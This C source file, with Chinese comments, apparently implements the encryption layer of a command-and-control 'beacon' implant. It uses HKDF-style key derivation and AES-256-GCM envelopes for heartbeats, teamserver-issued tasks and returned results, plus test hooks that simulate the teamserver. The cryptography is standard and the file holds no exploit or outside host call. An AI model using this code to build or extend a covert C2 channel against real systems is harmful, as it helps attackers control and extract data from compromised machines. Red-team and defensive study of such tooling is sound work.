#include "beacon_crypto.h"

#include <bcrypt.h>

#pragma comment(lib, "bcrypt.lib")

#ifdef BEACON_TEST
static NTSTATUS (WINAPI *g_crypto_random_provider)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG) = BCryptGenRandom;

VOID CryptoTestSetRandomProvider(NTSTATUS (WINAPI *provider)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG))
{
    g_crypto_random_provider = provider ? provider : BCryptGenRandom;
}

VOID CryptoTestResetRandomProvider(VOID)
{
    g_crypto_random_provider = BCryptGenRandom;
}
#endif

/* 加密信封常量 */
#define KEY_SIZE 32u
#define NONCE_SIZE 12u
#define TAG_SIZE 16u
#define ENVELOPE_VERSION 1u

/* KDF 与 AAD 共用的 purpose 字符串 */
#define PURPOSE_HEARTBEAT "teamserver/heartbeat/v1"
#define PURPOSE_TASK      "teamserver/task/v1"
#define PURPOSE_RESULT    "teamserver/result/v1"

/* 从 BCrypt 算法或哈希句柄读取 DWORD 属性 */
static INT GetDwordProp(BCRYPT_HANDLE h, LPCWSTR prop, DWORD* value)
{
    DWORD cb = 0;
    return BCryptGetProperty(h, prop, (PUCHAR)value, sizeof(*value), &cb, 0) >= 0;
}

/* 通过 BCrypt 用加密随机字节填充缓冲区 */
INT CryptoRandom(VOID* out, SIZE_T len)
{
    if (len == 0) {
        return 1;
    }
    if (!out || len > MAXDWORD) {
        return 0;
    }
#ifdef BEACON_TEST
    return g_crypto_random_provider(NULL, (PUCHAR)out, (ULONG)len, BCRYPT_USE_SYSTEM_PREFERRED_RNG) >= 0;
#else
    return BCryptGenRandom(NULL, (PUCHAR)out, (ULONG)len, BCRYPT_USE_SYSTEM_PREFERRED_RNG) >= 0;
#endif
}

/* 生成单个随机 UINT32 值，成功写入 out 并返回 TRUE；随机结果为 0 仍是合法值 */
BOOL CryptoRandomU32(UINT32* out)
{
    UINT32 v;

    if (!out) return FALSE;
    if (!CryptoRandom(&v, sizeof(v))) return FALSE;

    *out = v;
    return TRUE;
}

/* 使用给定密钥对数据计算 HMAC-SHA256，将 MAC 追加到 out */
static INT HmacSha256(const BYTE8* key, SIZE_T key_len, const BYTE8* data, SIZE_T data_len, ByteBuf* out)
{
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_HASH_HANDLE hash = NULL;
    DWORD obj_len = 0;
    DWORD hash_len = 0;
    BYTE8* obj = NULL;
    INT ok = 0;

    BbInit(out);

    /* 打开 HMAC-SHA256 算法提供者 */
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG) < 0) goto cleanup;
    if (!GetDwordProp(alg, BCRYPT_OBJECT_LENGTH, &obj_len) || !GetDwordProp(alg, BCRYPT_HASH_LENGTH, &hash_len)) goto cleanup;

    /* 分配工作对象并预留输出空间 */
    obj = (BYTE8*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)obj_len);
    if (!obj || !BbReserve(out, hash_len)) goto cleanup;

    /* 创建哈希、输入数据并完成 */
    if (BCryptCreateHash(alg, &hash, obj, obj_len, (PUCHAR)key, (ULONG)key_len, 0) < 0) goto cleanup;
    if (data_len && BCryptHashData(hash, (PUCHAR)data, (ULONG)data_len, 0) < 0) goto cleanup;
    out->len = hash_len;
    if (BCryptFinishHash(hash, out->data, hash_len, 0) < 0) {
        out->len = 0;
        goto cleanup;
    }
    ok = 1;

cleanup:
    if (hash) BCryptDestroyHash(hash);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    if (obj) {
        SecureZeroMemory(obj, obj_len);
        HeapFree(GetProcessHeap(), 0, (obj));
    }
    if (!ok) BbFree(out);
    return ok;
}

/* 计算文件的 SHA-256 摘要，可选返回文件大小 */
INT CryptoSha256File(const WCHAR* path, ByteBuf* digest, UINT64* size_out)
{
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_HASH_HANDLE hash = NULL;
    DWORD obj_len = 0;
    DWORD hash_len = 0;
    BYTE8* obj = NULL;
    HANDLE f = INVALID_HANDLE_VALUE;
    BYTE8 buffer[64 * 1024];
    INT ok = 0;
    UINT64 total = 0;

    BbInit(digest);
    f = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return 0;

    /* 打开 SHA-256 提供者并查询对象/哈希长度 */
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0) < 0) goto cleanup;
    if (!GetDwordProp(alg, BCRYPT_OBJECT_LENGTH, &obj_len) || !GetDwordProp(alg, BCRYPT_HASH_LENGTH, &hash_len)) goto cleanup;

    /* 分配工作对象并预留摘要输出空间 */
    obj = (BYTE8*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)obj_len);
    if (!obj || !BbReserve(digest, hash_len)) goto cleanup;
    if (BCryptCreateHash(alg, &hash, obj, obj_len, NULL, 0, 0) < 0) goto cleanup;

    /* 以 64KB 块读取文件并输入哈希 */
    for (;;) {
        DWORD n_read = 0;
        INT ok_read = ReadFile(f, buffer, (DWORD)sizeof(buffer), &n_read, NULL);
        if (n_read) {
            total += n_read;
            if (BCryptHashData(hash, buffer, (ULONG)n_read, 0) < 0) goto cleanup;
        }
        if (!ok_read || n_read < sizeof(buffer)) {
            if (!ok_read) goto cleanup;
            break;
        }
    }

    /* 完成哈希并返回结果 */
    digest->len = hash_len;
    if (BCryptFinishHash(hash, digest->data, hash_len, 0) < 0) {
        digest->len = 0;
        goto cleanup;
    }
    if (size_out) *size_out = total;
    ok = 1;

cleanup:
    if (f != INVALID_HANDLE_VALUE) CloseHandle(f);
    if (hash) BCryptDestroyHash(hash);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    if (obj) {
        SecureZeroMemory(obj, obj_len);
        HeapFree(GetProcessHeap(), 0, (obj));
    }
    if (!ok) BbFree(digest);
    return ok;
}

/* 使用类似 HKDF 的扩展（HMAC-SHA256）从密钥派生 32 字节密钥 */
static INT DeriveKey(const BYTE8* secret, SIZE_T secret_len, const CHAR* purpose, BYTE8 out_key[KEY_SIZE])
{
    static const CHAR salt[] = "TeamServer key schedule v1";
    ByteBuf prk, prev, data, step;
    SIZE_T out_len = 0;
    UINT8 counter = 1;
    INT ok = 0;

    BbInit(&prk); BbInit(&prev); BbInit(&data); BbInit(&step);

    /* 提取阶段：PRK = HMAC-SHA256(salt, secret) */
    if (!HmacSha256((const BYTE8*)salt, strlen(salt), secret, secret_len, &prk)) goto cleanup;

    /* 扩展阶段：生成 KEY_SIZE 字节的密钥材料 */
    while (out_len < KEY_SIZE) {
        SIZE_T take;
        BbFree(&data);
        BbInit(&data);
        if (!BbAppend(&data, prev.data, prev.len) ||
            !BbAppend(&data, purpose, strlen(purpose)) ||
            !BbU8(&data, counter++)) {
            goto cleanup;
        }
        BbFree(&step);
        if (!HmacSha256(prk.data, prk.len, data.data, data.len, &step)) goto cleanup;
        take = KEY_SIZE - out_len;
        if (take > step.len) take = step.len;
        memcpy(out_key + out_len, step.data, take);
        out_len += take;
        BbFree(&prev);
        prev = step;
        BbInit(&step);
    }
    ok = 1;

cleanup:
    BbFree(&prk); BbFree(&prev); BbFree(&data); BbFree(&step);
    return ok;
}

/* 使用 AES-256-GCM 加密明文，前置版本 + nonce 并追加认证标签 */
static INT AesGcmSeal(const BYTE8 key[KEY_SIZE], const BYTE8* plain, SIZE_T plain_len, const CHAR* aad, ByteBuf* out)
{
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE aes = NULL;
    DWORD obj_len = 0;
    BYTE8* obj = NULL;
    BYTE8 nonce[NONCE_SIZE];
    BYTE8 tag[TAG_SIZE];
    ByteBuf cipher;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    ULONG written = 0;
    INT ok = 0;

    BbInit(out);
    BbInit(&cipher);

    /* 明文长度超过 ULONG 范围会导致截断 */
    if (plain_len > MAXDWORD) goto cleanup;

    /* 为本次加密生成随机 nonce */
    if (!CryptoRandom(nonce, sizeof(nonce))) goto cleanup;

    /* 设置 AES-GCM 算法和密钥 */
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0) < 0) goto cleanup;
    if (BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) < 0) goto cleanup;
    if (!GetDwordProp(alg, BCRYPT_OBJECT_LENGTH, &obj_len)) goto cleanup;
    obj = (BYTE8*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)obj_len);
    if (!obj) goto cleanup;
    if (BCryptGenerateSymmetricKey(alg, &aes, obj, obj_len, (PUCHAR)key, KEY_SIZE, 0) < 0) goto cleanup;

    /* 使用认证数据加密明文 */
    if (!BbReserve(&cipher, plain_len)) goto cleanup;
    cipher.len = plain_len;
    BCRYPT_INIT_AUTH_MODE_INFO(info);
    info.pbNonce = nonce;
    info.cbNonce = sizeof(nonce);
    info.pbAuthData = (PUCHAR)aad;
    info.cbAuthData = (ULONG)strlen(aad);
    info.pbTag = tag;
    info.cbTag = sizeof(tag);
    if (BCryptEncrypt(aes, (PUCHAR)plain, (ULONG)plain_len, &info, NULL, 0,
                      cipher.data, (ULONG)cipher.len, &written, 0) < 0) goto cleanup;
    cipher.len = written;

    /* 构建信封：版本 || nonce || 密文 || 标签 */
    if (!BbU8(out, ENVELOPE_VERSION) ||
        !BbAppend(out, nonce, sizeof(nonce)) ||
        !BbAppend(out, cipher.data, cipher.len) ||
        !BbAppend(out, tag, sizeof(tag))) goto cleanup;
    ok = 1;

cleanup:
    if (aes) BCryptDestroyKey(aes);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    if (obj) {
        SecureZeroMemory(obj, obj_len);
        HeapFree(GetProcessHeap(), 0, (obj));
    }
    BbFree(&cipher);
    if (!ok) BbFree(out);
    return ok;
}

/* 解密 AES-256-GCM 信封，验证版本、nonce 和认证标签 */
static INT AesGcmOpen(const BYTE8 key[KEY_SIZE], const BYTE8* env, SIZE_T env_len, const CHAR* aad, ByteBuf* out)
{
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE aes = NULL;
    DWORD obj_len = 0;
    BYTE8* obj = NULL;
    const BYTE8* nonce;
    const BYTE8* cipher;
    const BYTE8* tag;
    SIZE_T cipher_len;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    ULONG written = 0;
    INT ok = 0;

    BbInit(out);

    /* 验证最小信封大小和版本字节 */
    if (env_len < 1 + NONCE_SIZE + TAG_SIZE || env[0] != ENVELOPE_VERSION) goto cleanup;

    /* 密文长度超过 ULONG 范围会导致截断 */
    cipher_len = env_len - 1 - NONCE_SIZE - TAG_SIZE;
    if (cipher_len > MAXDWORD) goto cleanup;
    nonce = env + 1;
    cipher = nonce + NONCE_SIZE;
    tag = env + env_len - TAG_SIZE;

    /* 设置 AES-GCM 算法和密钥 */
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0) < 0) goto cleanup;
    if (BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) < 0) goto cleanup;
    if (!GetDwordProp(alg, BCRYPT_OBJECT_LENGTH, &obj_len)) goto cleanup;
    obj = (BYTE8*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)obj_len);
    if (!obj || !BbReserve(out, cipher_len)) goto cleanup;
    out->len = cipher_len;
    if (BCryptGenerateSymmetricKey(alg, &aes, obj, obj_len, (PUCHAR)key, KEY_SIZE, 0) < 0) goto cleanup;

    /* 解密并认证密文 */
    BCRYPT_INIT_AUTH_MODE_INFO(info);
    info.pbNonce = (PUCHAR)nonce;
    info.cbNonce = NONCE_SIZE;
    info.pbAuthData = (PUCHAR)aad;
    info.cbAuthData = (ULONG)strlen(aad);
    info.pbTag = (PUCHAR)tag;
    info.cbTag = TAG_SIZE;
    if (BCryptDecrypt(aes, (PUCHAR)cipher, (ULONG)cipher_len, &info, NULL, 0,
                      out->data, (ULONG)out->len, &written, 0) < 0) {
        out->len = 0;
        goto cleanup;
    }
    out->len = written;
    ok = 1;

cleanup:
    if (aes) BCryptDestroyKey(aes);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    if (obj) {
        SecureZeroMemory(obj, obj_len);
        HeapFree(GetProcessHeap(), 0, (obj));
    }
    if (!ok) BbFree(out);
    return ok;
}

/* 使用从根密钥派生的密钥加密心跳消息 */
INT CryptoEncryptHeartbeat(const CHAR* root_key, const ByteBuf* plain, ByteBuf* out)
{
    BYTE8 key[KEY_SIZE];
    INT ok;
    BbInit(out);
    ok = DeriveKey((const BYTE8*)root_key, strlen(root_key), PURPOSE_HEARTBEAT, key) &&
         AesGcmSeal(key, plain->data, plain->len, PURPOSE_HEARTBEAT, out);
    SecureZeroMemory(key, sizeof(key));
    return ok;
}

/* 使用从会话密钥派生的密钥解密任务信封 */
INT CryptoDecryptTask(const BYTE8* session_key, SIZE_T session_key_len, const ByteBuf* env, ByteBuf* out)
{
    BYTE8 key[KEY_SIZE];
    INT ok;
    BbInit(out);
    ok = DeriveKey(session_key, session_key_len, PURPOSE_TASK, key) &&
         AesGcmOpen(key, env->data, env->len, PURPOSE_TASK, out);
    SecureZeroMemory(key, sizeof(key));
    return ok;
}

/* 使用从会话密钥派生的密钥加密结果消息 */
INT CryptoEncryptResult(const BYTE8* session_key, SIZE_T session_key_len, const ByteBuf* plain, ByteBuf* out)
{
    BYTE8 key[KEY_SIZE];
    INT ok;
    BbInit(out);
    ok = DeriveKey(session_key, session_key_len, PURPOSE_RESULT, key) &&
         AesGcmSeal(key, plain->data, plain->len, PURPOSE_RESULT, out);
    SecureZeroMemory(key, sizeof(key));
    return ok;
}

#ifdef BEACON_TEST
/* 测试专用：模拟 teamserver 使用 TASK purpose 加密下发任务。 */
INT CryptoTestEncryptTask(const BYTE8* session_key, SIZE_T session_key_len,
                          const ByteBuf* plain, ByteBuf* out)
{
    BYTE8 key[KEY_SIZE];
    INT ok;

    BbInit(out);
    ok = DeriveKey(session_key, session_key_len, PURPOSE_TASK, key) &&
         AesGcmSeal(key, plain->data, plain->len, PURPOSE_TASK, out);
    SecureZeroMemory(key, sizeof(key));
    return ok;
}

/* 测试专用：模拟 teamserver 使用 RESULT purpose 解密结果。 */
INT CryptoTestDecryptResult(const BYTE8* session_key, SIZE_T session_key_len,
                            const ByteBuf* env, ByteBuf* out)
{
    BYTE8 key[KEY_SIZE];
    INT ok;

    BbInit(out);
    ok = DeriveKey(session_key, session_key_len, PURPOSE_RESULT, key) &&
         AesGcmOpen(key, env->data, env->len, PURPOSE_RESULT, out);
    SecureZeroMemory(key, sizeof(key));
    return ok;
}
#endif
